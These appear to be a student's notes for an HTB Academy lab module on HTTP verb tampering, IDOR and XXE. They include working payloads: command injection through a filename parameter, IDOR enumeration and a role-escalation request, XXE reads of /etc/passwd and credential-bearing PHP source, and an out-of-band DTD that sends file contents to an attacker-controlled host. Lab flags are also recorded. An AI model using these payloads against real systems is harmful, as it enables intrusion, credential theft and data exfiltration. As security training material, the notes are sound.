# HTB Academy — CWES Web Attacks Module Notes

**Module:** Web Attacks (Sections 1–17)  
**Topics:** HTTP Verb Tampering | IDOR | XXE Injection

---

## Section-by-Section Notes

### Section 1–2: HTTP Verb Tampering — Background

Web servers enforce auth via config like `<Limit GET POST>` in Apache. This only restricts the listed verbs — any other HTTP method (HEAD, DELETE, PUT, PATCH, MOVE, etc.) hits the resource without auth. PHP apps may also use `$_POST['param']` in a filter but `$_REQUEST['param']` in execution — sending the same param via GET bypasses the filter.

Two root causes:
- **Insecure config:** server `<Limit>` block misses verbs → auth bypass
- **Insecure coding:** filter method ≠ execution method → input sanitization bypass

---

### Section 3: HTTP Verb Tampering — Auth Bypass (Exercise)

**Scenario:** `/admin/reset.php` returns 401 (HTTP Basic Auth required).

What worked:
- `HEAD` → 401 (also restricted)
- `OPTIONS` → 200 but no `Allow` header shown
- `DELETE` → 200 OK (auth bypassed)
- `PATCH` → 200 OK
- `PUT` → 200 OK

The reset action executed on any of those verbs. Checking the index page after showed the flag in the HTML.

**Lesson:** HEAD isn't guaranteed to bypass. Try ALL verbs — DELETE/PATCH/PUT are almost never in `<Limit>` blocks in misconfigured servers.

**Flag:** (from module exercise, not tracked here)

---

### Section 4–5: HTTP Verb Tampering — Filter Bypass (Theory)

Filter bypass works when:
```php
if (preg_match('/[^a-zA-Z0-9]/', $_POST['filename'])) { die(); }
system("cp " . $_REQUEST['filename'] . " ...");
```

`$_REQUEST` aggregates GET + POST + COOKIE. If the filter only checks `$_POST`, send the malicious param via GET instead. The filter sees nothing; the `system()` call gets the payload.

---

### Section 6: HTTP Verb Tampering — Filter Bypass (Exercise)

**Flag:** `HTB{b3_v3rb_c0n51573n7}`

Attack:
```bash
curl -s -X POST http://<TARGET>/index.php \
  --data-urlencode "filename=file; cp /flag.txt ./"
curl -s http://<TARGET>/flag.txt
```

The form uses GET internally, filter checked `$_GET` — switching to POST bypassed the filter entirely.

---

### Section 7–8: IDOR — Mass Enumeration (Exercise)

**Scenario:** `/documents.php` returns a list of documents per user. There's no access control on which uid you can query.

**Critical discovery:** The main page JS showed `$.redirect("/documents.php", {uid: uid}, "POST", "_self")` — the endpoint uses POST, not GET. GET always returned an empty document list. Reading the JS source saved a lot of time.

**Terminal line-wrap problem:** A for-loop with long grep patterns pasted into the terminal got split across lines, breaking the pattern. Fix: write the loop to `/tmp/enum.sh` and execute with `bash /tmp/enum.sh`.

```bash
cat > /tmp/enum.sh << 'EOF'
#!/bin/bash
url="http://<TARGET>"
for i in {1..20}; do
    for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.(pdf|txt)"); do
        echo "uid=$i: $link"
        curl -s "$url$link"
    done
done
EOF
bash /tmp/enum.sh
```

**Flag:** Found in PDF content when enumerating all UIDs.

---

### Section 9: IDOR — Encoded/Hashed References (Exercise)

**Scenario:** `/download.php?contract=<hash>` — contract parameter is encoded.

**Module said:** MD5(base64(uid)) via POST  
**Reality:** The actual JS was `window.location = /download.php?contract=${encodeURIComponent(btoa(uid))}` — pure base64 via GET. **Always read the actual app's JS, not just the module walkthrough.**

**Base64 `=` signs problem:** `echo -n 20 | base64` gives `MjA=` — the `=` breaks URL params. Fix: `curl -G --data-urlencode "contract=$b64"` handles percent-encoding automatically.

```bash
for i in {1..20}; do
    b64=$(echo -n $i | base64 -w 0)
    content=$(curl -s -G --data-urlencode "contract=$b64" "http://<TARGET>/download.php" | strings)
    echo "$content" | grep -q "HTB{" && echo "uid=$i: $(echo "$content" | grep "HTB{")"
done
```

**Flag:** Found at uid=20.

---

### Section 10–11: IDOR — API Chaining (Exercise)

**Scenario:** `/profile/api.php/profile/<uid>` returns full profile including uuid. No access control on GET. PUT requires matching uid+uuid from the record being modified.

**Chained attack:**
1. GET all UIDs 1-10 → find admin (uid=10, role=`staff_admin`)
2. GET own profile (uid=5) → get own uuid
3. PUT own profile with `"role":"staff_admin"` → escalate to admin
4. Refresh UI → admin panel with flag

**uid mismatch error root cause:** Pasting a long JSON `-d` string in terminal caused line-wrap, inserting a literal newline inside `"about":"..."`. This made the JSON invalid — the server parsed it wrong and uid values didn't match. Fix: keep `"about":"X"` short (single character).

```bash
curl -s -X PUT "http://<TARGET>/profile/api.php/profile/5" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"uid":"5","uuid":"<OWN_UUID>","role":"staff_admin","full_name":"X","email":"x@x.com","about":"X"}'
```

**Flag:** On `/profile/index.php` after role escalation.

---

### Sections 12–13: XXE — Background

XXE: XML allows `<!ENTITY name SYSTEM "URI">` to fetch external resources. If user-controlled XML is parsed without disabling external entities, attacker can read arbitrary files or make the server issue HTTP requests.

Two types:
- **Reflected/Local XXE:** response includes entity content
- **Blind XXE:** no visible output — use OOB via HTTP callback or error messages

---

### Section 14: XXE — Basic File Read + PHP Source Read (Exercise)

**Target:** 10.129.234.170 (VPN required)

**Confirmed reflected field:** `<email>` field returned entity content in response.

Basic file read:
```bash
curl -s -X POST http://10.129.234.170/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'
```

PHP source read (connection.php had DB creds):
```bash
curl -s -X POST http://10.129.234.170/submitDetails.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'
```

Decoded: contained `api_key` and PostgreSQL credentials.

---

### Section 15: XXE — CDATA Method (Exercise)

**Problem:** Reading `flag.php` directly via `file://` fails because PHP tags contain `<` and `>` which break the XML structure. `php://filter` base64-encodes so that works for PHP. But CDATA wrapping is the alternative for non-PHP contexts.

**Why CDATA works:** Wrapping file content in `<![CDATA[...]]>` tells XML to treat everything inside as literal text (not markup). But you can't join parameter entities inline inside the DOCTYPE — must use an external DTD.

External DTD (`/tmp/xxe.dtd`):
```
<!ENTITY joined "%begin;%file;%end;">
```

Payload loads DTD from attacker server, which joins `<![CDATA[` + file content + `]]>` into `&joined;`. File content appears raw in response.

**Flag:** Appeared directly in response without any base64 decode needed.

---

### Section 16: XXE — Blind OOB (Exercise)

**Scenario:** `/blind/submitDetails.php` — no output reflection at all.

**Attack:** Target server fetches attacker's DTD via HTTP. DTD declares `%oob;` which makes target issue another HTTP GET to attacker's server with file content base64-encoded as a query parameter.

PHP listener catches it:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

External DTD:
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/flag.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<OUR_IP>:8000/?content=%file;'>">
```

**Bash history expansion bug:** Writing the DTD via `echo` or `python -c` with `!` in the DTD content (`<!ENTITY`) triggered bash history expansion and broke the command. Fix: write DTD content directly with `nano /tmp/xxe.dtd`.

**PHP vs Python server:** Python's `http.server` serves static files but doesn't execute PHP. OOB needs the PHP listener to decode base64 in the URL param and log it — must use `php -S 0.0.0.0:8000`.

**Flag:** `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`

---

### Section 17: Prevention (No Exercise)

Key prevention techniques:
- Disable external entity processing in XML parser (e.g., `libxml_disable_entity_loader(true)` in PHP)
- Use non-XML formats (JSON) for user input where possible
- Use XSLT for XML transformation instead of passing raw user XML to parser
- Validate/sanitize XML against strict schema (XSD)
- For HTTP Verb Tampering: use `<LimitExcept GET POST>` (deny all except listed) instead of `<Limit GET POST>` (deny only listed)
- For IDOR: never use user-controlled references as direct DB identifiers; always re-validate ownership server-side

---

## Flags Collected

| Section | Attack | Flag |
|---------|--------|------|
| Section 6 | HTTP Verb Tampering filter bypass | `HTB{b3_v3rb_c0n51573n7}` |
| Section 16 | Blind OOB XXE | `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}` |

---

## Key Lessons

### HTTP Verb Tampering
1. HEAD isn't always unprotected — try ALL verbs: DELETE, PUT, PATCH, MOVE
2. The filter bypass works because PHP's `$_REQUEST` aggregates all sources — only need the filter to miss one source
3. OPTIONS doesn't always return an `Allow` header — just try verbs directly

### IDOR
1. **Always read JS source first** — determines GET vs POST, encoding scheme, endpoint path
2. `$.redirect()` = POST; `window.location =` = GET; `$.ajax` = check `type:` field
3. Use `-G --data-urlencode` for base64 params — handles `=` padding automatically
4. Module walkthroughs may differ from live apps — real app used `btoa()` not `MD5(btoa())`
5. Keep JSON compact in curl `-d` — line-wrap causes parse errors and misleading uid/uuid mismatch errors
6. API IDOR chain: read (get uuid with no auth check) → write (use leaked uuid to modify any record)

### XXE
1. Choose method based on: (reflected? → file type?) / (not reflected? → errors shown?)
2. PHP filter (`php://filter/convert.base64-encode`) solves XML special char problem for all PHP files
3. External DTD is required for CDATA method — XML parser forbids joining internal+external parameter entities inline
4. Blind OOB must use PHP server (not Python) to execute `index.php` for base64 decoding
5. Never write DTD files with `!` characters from bash command line — use nano
6. Error-based XXE is the fastest blind technique when PHP errors are enabled — forces file content into the error message path

### General
- Write long scripts to `/tmp/script.sh` and execute with `bash` — avoids terminal line-wrap breaking grep patterns
- `strings` on curl output cleans up binary/PDF content so grep can find flags
- Background server management: `command &` to start, `kill %1` to stop
